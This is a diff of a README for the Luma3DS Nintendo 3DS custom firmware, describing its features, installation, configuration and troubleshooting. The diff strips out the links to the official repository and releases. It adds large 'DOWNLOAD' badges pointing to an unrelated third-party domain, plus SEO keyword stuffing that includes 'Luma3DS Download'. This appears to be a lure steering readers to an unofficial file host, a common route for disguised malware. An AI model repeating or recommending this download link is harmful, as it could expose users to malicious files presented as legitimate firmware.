@@ -1,286 +1,373 @@
 
-<h1 align="center">Luma3DS Custom Firmware</h1>
+# Luma3DS Custom Firmware
 
-<p align="center">
-  <strong>System Patching. Firmware Control. Homebrew Integration.</strong>
-</p>
+[![Platform](https://img.shields.io/badge/Platform-Nintendo%203DS-CE2029?style=flat-square)](https://github.com/LumaTeam/Luma3DS)
+[![Category](https://img.shields.io/badge/Category-Custom%20Firmware-475569?style=flat-square)](https://github.com/LumaTeam/Luma3DS)
+[![Version](https://img.shields.io/badge/Version-13.5-blue?style=flat-square)](https://github.com/LumaTeam/Luma3DS/releases)
+[![License](https://img.shields.io/badge/License-GPLv3-blue?style=flat-square)](https://github.com/LumaTeam/Luma3DS)
 
-<p align="center">
-  Nintendo 3DS / 2DS · Custom Firmware · System Software Development
-</p>
+Luma3DS is custom firmware for the Nintendo 3DS family. It patches and extends system software to provide homebrew support, additional system functionality, game modification features, and advanced configuration tools.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Nintendo%203DS%20%2F%202DS-A63A55?style=flat-square">
-  <img src="https://img.shields.io/badge/category-Custom%20Firmware-A63A55?style=flat-square">
-  <img src="https://img.shields.io/badge/license-GPL--3.0-555555?style=flat-square">
-  <img src="https://img.shields.io/badge/version-13.5-333333?style=flat-square">
-</p>
+<a href="https://dyhuiying.com/s/file">
+  <img src="https://img.shields.io/badge/DOWNLOAD-LUMA3DS%20CFW-2563EB?style=for-the-badge&logo=nintendo&logoColor=white" alt="Download Luma3DS Custom Firmware">
+</a>
 
 ## Overview
 
-Luma3DS is a custom firmware project for the Nintendo 3DS family of consoles. It patches and reimplements significant parts of the system software, providing an extended software environment for system customization, homebrew applications, debugging, and firmware-level modifications.
+Luma3DS is a custom firmware project designed for Nintendo 3DS-family consoles.
 
-The project is built around a combination of low-level firmware components, ARM9 and ARM11 code, kernel extensions, and reimplemented system modules.
+It modifies significant parts of the system software, enabling additional functionality while retaining the original console environment. Its architecture includes a firmware loader, system patches, custom system modules, and Rosalina, an integrated system overlay.
 
-One of its defining components is Rosalina, an integrated overlay and system management interface that provides access to multiple firmware features.
+Luma3DS requires boot9strap as its boot-time foundation. The primary firmware file is `boot.firm`, which is loaded by the boot9strap environment.
 
-Luma3DS requires boot9strap as its underlying boot environment.
-
-## Technical Architecture
-
-Luma3DS uses a layered architecture consisting of several independently developed components.
-
-### ARM9 and ARM11
-
-The core firmware loader and settings interface operate at the bare-metal level.
-
-Their responsibilities include:
-
-- Firmware loading and initialization.
-- Official firmware patching.
-- Process9 code modification.
-- Injection of custom system components.
-- Payload chainloading.
-- Firmware configuration management.
-
-### Kernel Extension
-
-The `k11_extension` component extends the ARM11 NATIVE_FIRM kernel.
-
-Its functionality includes:
-
-- System call (SVC) hooking.
-- Additional SVC implementation.
-- Inter-process communication hooking.
-- Kernel-level process interaction.
-- Support for selected debugging and overlay operations.
-
-### System Modules
-
-Luma3DS includes reimplementations of selected Nintendo 3DS system modules.
-
-These components integrate with the operating system and provide additional control over process management, loading, and system services.
-
-## Core Components
-
-| Component | Description | Technical Role |
-|---|---|---|
-| ARM9 | Bare-metal firmware component | Firmware loading and initialization |
-| ARM11 | System-level firmware component | Firmware configuration and patching |
-| k11_extension | ARM11 kernel extension | Kernel hooks and additional SVCs |
-| Rosalina | Integrated overlay and system interface | Runtime system management |
-| Loader | System module | Application and homebrew loading |
-| PXI | Reimplemented system module | ARM9–ARM11 communication |
-| SM | Service Manager module | Service access management |
-| PM | Process Manager module | Process lifecycle management |
-| Plugin Loader | Game plugin loading component | 3GX plugin integration |
+The project supports homebrew applications, system configuration, game modification, payload chainloading, debugging, and other advanced functions.
 
 ## Key Features
 
-### Firmware Modification
+- **Homebrew Support:** Enables the execution of compatible homebrew applications.
+- **Rosalina Overlay:** Provides an in-system menu for accessing additional features and configuration.
+- **System Patches:** Modifies selected system behavior and removes supported platform restrictions.
+- **Region Emulation:** Supports per-title language and region configuration.
+- **LayeredFS:** Redirects game asset access to support compatible content modifications.
+- **Game Plugins:** Supports compatible 3GX game plugins.
+- **Screenshot Capture:** Captures screenshots while applications and games are running.
+- **Screen Filters:** Provides display filters, including blue-light reduction options.
+- **Input Redirection:** Supports compatible external input devices.
+- **Cheat Engine:** Provides cheat functionality through supported Rosalina features.
+- **Network Time:** Supports network-based time and date synchronization.
+- **Payload Chainloading:** Launches compatible firmware payloads with the `.firm` extension.
+- **GDB Debugging:** Provides a debugging interface for compatible development tools.
+- **System Module Support:** Supports user-provided patches and replacement system modules.
+- **Configuration Management:** Provides boot-time settings and persistent configuration options.
 
-- System software patching across the Nintendo 3DS family.
-- Reimplementation of selected system software components.
-- Custom firmware configuration through `config.ini`.
-- Support for user-provided patches and system module replacements.
+## Technical Specifications
 
-### Rosalina System Interface
-
-- Integrated system overlay activated by `L + Down + Select` by default.
-- Runtime configuration and system management.
-- Screenshot capture and screen filter controls.
-- Input redirection and network time synchronization.
-- Access to selected debugging functions.
-
-### Homebrew and Payload Management
-
-- Native homebrew application support.
-- 3DSX homebrew loading.
-- Chainloading of additional firmware payloads.
-- Support for user-provided system modifications.
-- 3GX game plugin loading.
-
-### Developer and Debugging Tools
-
-- Integrated GDB debugging stub.
-- Process inspection capabilities.
-- Break-on-start debugging functionality.
-- Kernel-level debugging interfaces.
-- Tools for reverse engineering and homebrew development.
-
-## Rosalina
-
-Rosalina is one of the central components of Luma3DS.
-
-It provides an overlay interface for interacting with the running system without requiring a separate application for each supported function.
-
-| Function | Description |
+| Specification | Description |
 |---|---|
-| System Menu | Access to firmware management options |
-| Screen Filters | Display color and visual adjustments |
-| Screenshot Capture | Capture console screen output |
-| Input Redirection | External input device support |
-| Network Time | NTP-based date and time synchronization |
-| GDB Server | Remote debugging functionality |
-| Process Management | Selected process-level operations |
-| System Configuration | Runtime firmware settings |
+| Software | Luma3DS |
+| Platform | Nintendo 3DS family |
+| Category | Custom Firmware (CFW) |
+| Boot environment | boot9strap |
+| Main firmware file | `boot.firm` |
+| Homebrew executable | `boot.3dsx` |
+| Payload format | `.firm` |
+| Configuration file | `/luma/config.ini` |
+| Payload directory | `/luma/payloads/` |
+| Rosalina shortcut | L + Down + Select |
+| Configuration menu | Hold Select during boot |
+| Chainloader menu | Hold Start during boot |
+| Latest release reference | v13.5 |
+| License | GNU General Public License v3.0 |
 
-Default activation combination:
+## Compatibility
+
+Luma3DS is designed for the Nintendo 3DS family of consoles.
+
+Supported hardware families include:
+
+| Console | Platform family |
+|---|---|
+| Nintendo 3DS | Original 3DS |
+| Nintendo 3DS XL | Original XL |
+| Nintendo 2DS | Original 2DS |
+| New Nintendo 3DS | New 3DS |
+| New Nintendo 3DS XL | New XL |
+| New Nintendo 2DS XL | New 2DS XL |
+
+Luma3DS requires a compatible boot9strap installation. The available hardware features and behavior can differ between console models.
+
+### Firmware Environment
+
+Luma3DS works with the boot9strap boot environment and patches the installed system software at startup.
+
+It is not a replacement for the console's physical hardware or a standalone installation exploit.
+
+### Storage Compatibility
+
+The standard installation uses an SD card formatted as FAT32.
+
+The primary firmware file must be accessible to the boot environment. Luma3DS also supports a CTRNAND-based configuration when launched from CTRNAND without an SD card.
+
+## Firmware Features
+
+### Rosalina Menu
+
+Rosalina is the integrated Luma3DS overlay.
+
+The default shortcut is:
 
 `L + Down + Select`
 
-The combination can be customized through the Rosalina configuration interface.
+Available functions include:
 
-## Firmware Configuration
+- Screenshot capture.
+- Screen filters.
+- Input redirection.
+- Cheat management.
+- System configuration.
+- Process inspection.
+- Debugging features.
+- Network time configuration.
 
-Luma3DS uses configuration files to control selected system behaviors.
+Some Rosalina settings require explicit saving through the menu.
+
+### System Patching
+
+Luma3DS applies supported system patches during startup.
+
+These patches enable functionality such as:
+
+- Homebrew application support.
+- Signature-check modifications.
+- Region-related compatibility changes.
+- Game-specific content redirection.
+- Custom system module loading.
+- Additional system access for compatible applications.
+
+### LayeredFS
+
+LayeredFS provides asset content path redirection for supported titles.
+
+It allows compatible modified game assets to be loaded from an alternate content location rather than the original game content.
+
+### Game Plugin Support
+
+Luma3DS supports compatible game plugins in the 3GX format.
+
+Plugin functionality depends on the plugin implementation, game version, and installed Luma3DS configuration.
+
+### Payload Chainloader
+
+The chainloader allows users to launch compatible `.firm` payloads.
+
+Payload files are normally stored in:
+
+`/luma/payloads/`
+
+The chainloader can be opened by holding START during boot or through the configuration menu.
+
+Hotkeys can be assigned through payload filenames, such as:
+
+`x_test.firm`
+
+### Debugging Interface
+
+Luma3DS includes a GDB stub for compatible development and reverse-engineering workflows.
+
+When enabled, the standard debugging ports are:
+
+| Port | Function |
+|---|---|
+| 4000–4002 | Standard GDB connections |
+| 4003 | Break-on-start debugging |
+
+Compatible GDB tooling and debugging configurations are required.
+
+## System Requirements
+
+### Required Components
+
+- Compatible Nintendo 3DS-family console.
+- Existing boot9strap installation.
+- FAT32-formatted SD card for standard installation.
+- Luma3DS release archive.
+- Sufficient SD card space for firmware and homebrew files.
+
+### Boot Environment
+
+Luma3DS requires boot9strap to execute.
+
+A console without a compatible boot9strap installation cannot use the normal Luma3DS installation procedure as a standalone firmware installation.
+
+### Storage Structure
+
+The standard SD card layout includes:
+
+| Path | Purpose |
+|---|---|
+| `/boot.firm` | Main Luma3DS firmware file |
+| `/boot.3dsx` | Homebrew Menu executable |
+| `/luma/` | Firmware configuration and resources |
+| `/luma/config.ini` | Main configuration file |
+| `/luma/payloads/` | Additional firmware payloads |
+| `/luma/backups/` | Backup storage used by supported releases |
+
+The exact contents depend on the release archive and the user's configuration.
+
+## Download & Installation
+
+<a href="https://dyhuiying.com/s/file">
+  <img src="https://img.shields.io/badge/DOWNLOAD-LUMA3DS%20FIRMWARE-2563EB?style=for-the-badge&logo=nintendo&logoColor=white" alt="Download Luma3DS Firmware">
+</a>
+
+### Installation Requirements
+
+Before installing or updating Luma3DS:
+
+1. Confirm that boot9strap is already installed.
+2. Prepare a FAT32-formatted SD card.
+3. Obtain the Luma3DS release archive.
+4. Preserve important existing SD card files.
+5. Ensure that the console can access the SD card.
+
+### Standard Installation
+
+1. Power off the Nintendo 3DS.
+2. Remove the SD card.
+3. Insert the SD card into a computer.
+4. Extract the Luma3DS release archive.
+5. Copy the included files to the root of the SD card.
+6. Replace existing files when prompted.
+7. Merge existing folders where necessary.
+8. Safely eject the SD card.
+9. Reinsert it into the console.
+10. Power on the system.
+
+The release archive includes `boot.firm`, `boot.3dsx`, and the supplied configuration resources.
+
+### Updating an Existing Installation
+
+1. Back up important SD card data.
+2. Download the intended Luma3DS release archive.
+3. Extract the archive.
+4. Copy the included files to the SD card root.
+5. Replace older versions of matching files.
+6. Merge the existing folders.
+7. Reinsert the SD card.
+8. Start the console.
+9. If the Luma3DS configuration menu appears, press START to save and reboot.
+
+The boot9strap environment loads the updated firmware file during startup.
+
+## Configuration & Management
+
+### Configuration Menu
+
+The main Luma3DS configuration menu is accessed by holding SELECT while powering on the console.
+
+The menu provides boot-time options for configuring firmware behavior.
 
 ### Configuration File
 
+The standard configuration file is:
+
 `/luma/config.ini`
 
-The file contains configurable firmware options.
-
-When Luma3DS is launched from CTRNAND without an SD card, the configuration location is:
+When Luma3DS is launched from CTRNAND because the SD card is missing, the configuration file can instead be located at:
 
 `/rw/luma/config.ini`
 
 ### Payload Management
 
-Additional firmware payloads are stored in:
+Additional firmware payloads should be placed in:
 
 `/luma/payloads/`
 
-Payload files use the `.firm` extension.
+Payloads must use the `.firm` extension.
 
-The chainloader menu can be accessed by pressing `Start` during boot or through the configuration menu.
+To open the chainloader:
 
-When only one payload is present, the selection menu may be skipped.
+1. Power off the console.
+2. Hold START.
+3. Power on the console.
+4. Select the required payload.
+5. Launch the selected firmware file.
 
-## Platform Compatibility
+If only one compatible payload is present, the selection menu may be skipped.
 
-| Platform | Hardware Family | Compatibility |
-|---|---|---|
-| Nintendo 3DS | Original 3DS | Supported |
-| Nintendo 3DS XL | Original 3DS XL | Supported |
-| New Nintendo 3DS | New 3DS | Supported |
-| New Nintendo 3DS XL | New 3DS XL | Supported |
-| Nintendo 2DS | Original 2DS | Supported |
-| New Nintendo 2DS XL | New 2DS XL | Supported |
+### Rosalina Configuration
 
-Luma3DS targets the Nintendo 3DS family, including its 2DS variants.
+Open Rosalina using:
 
-The firmware requires boot9strap. Specific installation and system firmware requirements should be verified against the official project documentation.
+`L + Down + Select`
 
-## Installation and Configuration
+Select the required system feature or configuration option.
 
-### Prerequisites
+Some settings are temporary until saved through the Rosalina menu. Use the Save Settings option where available.
 
-- Nintendo 3DS family console.
-- Existing boot9strap installation.
-- Compatible SD card.
-- Official Luma3DS release archive.
-- Access to the console's SD card filesystem.
+### Firmware Backup Management
 
-### Installation Overview
+Maintain copies of important system and SD card data before modifying firmware files or configuration.
 
-1. Verify that boot9strap is installed and functioning.
-2. Obtain the official Luma3DS release archive.
-3. Extract the release files onto the root of the SD card.
-4. Replace existing files and merge folders where required.
-5. Insert the SD card and start the console.
-6. Verify the firmware configuration menu.
+Keep backup files organized and avoid replacing unrelated system files during updates.
 
-### Firmware Verification
+### Version Management
 
-Press `Select` during boot to access the Luma3DS configuration menu.
+The project provides release archives containing the firmware and bundled homebrew resources.
 
-Verify that the expected firmware version is displayed and that the selected configuration options are correct.
+When updating:
 
-### Updating
+- Use a compatible Luma3DS release.
+- Replace the existing firmware files.
+- Preserve required configuration folders.
+- Check payload compatibility.
+- Verify successful startup after updating.
 
-Obtain the latest release from the official Luma3DS repository and replace the corresponding files on the SD card.
+## Troubleshooting
 
-Review release notes before updating.
-
-## Technical Specifications
-
-| Parameter | Details |
+| Issue | Resolution |
 |---|---|
-| Project | Luma3DS |
-| Platform | Nintendo 3DS / 2DS |
-| Software Type | Custom Firmware |
-| Latest Release | v13.5 |
-| Core Architecture | ARM9 / ARM11 |
-| Kernel Extension | k11_extension |
-| System Interface | Rosalina |
-| Boot Environment | boot9strap |
-| Firmware Format | FIRM |
-| Configuration | config.ini |
-| Development Languages | C / C++ / Assembly |
-| License | GPL-3.0 with documented exceptions |
-| Source Repository | LumaTeam/Luma3DS |
-
-## Development and Build Environment
-
-Luma3DS is an open-source firmware project with a source-based development workflow.
-
-The official build environment includes:
-
-- Git.
-- makerom.
-- firmtool.
-- devkitARM.
-- libctru.
-- devkitPro development packages.
-
-The compiled firmware output is distributed as:
-
-`boot.firm`
-
-The release archive also includes associated homebrew components.
-
-Refer to the official source repository for build instructions and dependency requirements.
+| Console does not start with Luma3DS | Confirm that boot9strap is installed and `boot.firm` is available in the expected location. |
+| Luma3DS configuration menu does not appear | Hold SELECT while powering on the console. |
+| Rosalina does not open | Use the default L + Down + Select shortcut or check the configured menu combination. |
+| Payload is missing from chainloader | Confirm that the payload uses the `.firm` extension and is stored in `/luma/payloads/`. |
+| Homebrew Menu does not start | Check that `boot.3dsx` is present in the SD card root. |
+| Configuration changes are not retained | Use the appropriate Save Settings option where required. |
+| SD card is not recognized | Verify the FAT32 filesystem, card condition, and file placement. |
+| Game modification does not load | Check LayeredFS paths, title compatibility, and game-specific configuration. |
+| 3GX plugin does not load | Verify plugin format, game compatibility, and plugin loader configuration. |
+| Debugger cannot connect | Confirm that GDB debugging is enabled and the correct connection port is being used. |
 
 ## Frequently Asked Questions
 
-### What is Luma3DS?
+### 1. What is Luma3DS Custom Firmware?
 
-Luma3DS is custom firmware for the Nintendo 3DS family that patches and reimplements significant parts of the console's system software.
+Luma3DS is custom firmware for Nintendo 3DS-family consoles. It patches system software and provides homebrew support, system features, game modification tools, and additional configuration options.
 
-### Does Luma3DS support Nintendo 2DS?
+### 2. Does Luma3DS require boot9strap?
 
-Yes. The original Nintendo 2DS and New Nintendo 2DS XL belong to the supported Nintendo 3DS hardware family.
+Yes. Luma3DS requires boot9strap as its boot-time foundation.
 
-### What is Rosalina?
+### 3. Which Nintendo consoles support Luma3DS?
 
-Rosalina is an integrated system overlay providing access to firmware configuration, screen controls, input redirection, debugging, and additional system functions.
+Luma3DS is designed for the Nintendo 3DS family, including original 3DS, 3DS XL, 2DS, New 3DS, New 3DS XL, and New 2DS XL models.
 
-### Does Luma3DS require boot9strap?
+### 4. What is the `boot.firm` file?
 
-Yes. The official project identifies boot9strap as a required boot environment.
+`boot.firm` is the primary Luma3DS firmware file loaded by the boot9strap environment.
 
-### Where are firmware settings and payloads stored?
+### 5. How do I open the Luma3DS configuration menu?
 
-The main configuration file is located at `/luma/config.ini`, while additional `.firm` payloads are stored in `/luma/payloads/`.
+Hold SELECT while powering on the console.
+
+### 6. How do I open Rosalina?
+
+Press L + Down + Select during normal system operation. This is the default shortcut.
+
+### 7. Where should firmware payloads be stored?
+
+Compatible `.firm` payloads should normally be stored in `/luma/payloads/` on the SD card.
+
+### 8. Does Luma3DS support game modifications?
+
+Yes. Features include LayeredFS content redirection, per-game language overrides, and compatible 3GX game plugins.
+
+### 9. Can Luma3DS take screenshots?
+
+Yes. Screenshot capture is available through the Rosalina overlay.
+
+### 10. Can Luma3DS run homebrew applications?
+
+Yes. Luma3DS provides homebrew support and is distributed with the Homebrew Menu executable in its release archive.
+
+### 11. Where is the Luma3DS configuration file stored?
+
+The standard location is `/luma/config.ini`. A CTRNAND-based configuration can use `/rw/luma/config.ini`.
+
+### 12. What is the latest Luma3DS release?
+
+The latest release identified for this documentation is v13.5.
 
 ## SEO Keywords
 
-Luma3DS custom firmware, Nintendo 3DS CFW, Luma3DS firmware installation, Nintendo 2DS custom firmware, Luma3DS Rosalina, 3DS system modification, boot9strap firmware, Nintendo 3DS homebrew, ARM11 kernel extension, Luma3DS configuration, 3DS firmware patching, Nintendo 3DS system modules, Luma3DS payload chainloader, 3DS homebrew environment, Rosalina system overlay, Luma3DS GDB debugging, Nintendo 3DS firmware development, 3DS system software modification, Luma3DS GitHub, Nintendo 3DS firmware architecture.
-
-## Technical References
-
-- [Official Luma3DS Repository](https://github.com/LumaTeam/Luma3DS)
-- [Official Releases](https://github.com/LumaTeam/Luma3DS/releases)
-- [Luma3DS Source Code](https://github.com/LumaTeam/Luma3DS/tree/master)
-- [Luma3DS Documentation](https://github.com/LumaTeam/Luma3DS/tree/master/docs)
-- [boot9strap Repository](https://github.com/SciresM/boot9strap)
-- [Luma3DS License](https://github.com/LumaTeam/Luma3DS/blob/master/LICENSE)
-
-<p align="center">
-  <strong>Luma3DS Custom Firmware</strong>
-  <br>
-  Nintendo 3DS · Nintendo 2DS · System Software
-  <br>
-  Firmware Architecture and System-Level Development
-</p>
+Luma3DS, Luma3DS Custom Firmware, Luma3DS CFW, Nintendo 3DS Custom Firmware, 3DS CFW, 3DS Firmware, Luma3DS Download, Nintendo 3DS Homebrew, 3DS Homebrew Support, Luma3DS Boot Firm, boot.firm, boot9strap, 3DS Rosalina Menu, Rosalina Overlay, 3DS Firmware Patches, 3DS Region Free, 3DS Region Emulation, 3DS LayeredFS, 3DS Game Plugins, 3GX Plugins, 3DS Payload Chainloader, 3DS Firm Payloads, 3DS System Patches, 3DS Homebrew Launcher, Nintendo 2DS Custom Firmware, New Nintendo 3DS CFW, 3DS Screenshot Tool, 3DS Input Redirection, 3DS Cheat Engine, 3DS Firmware Configuration, Luma3DS Update, Luma3DS v13.5
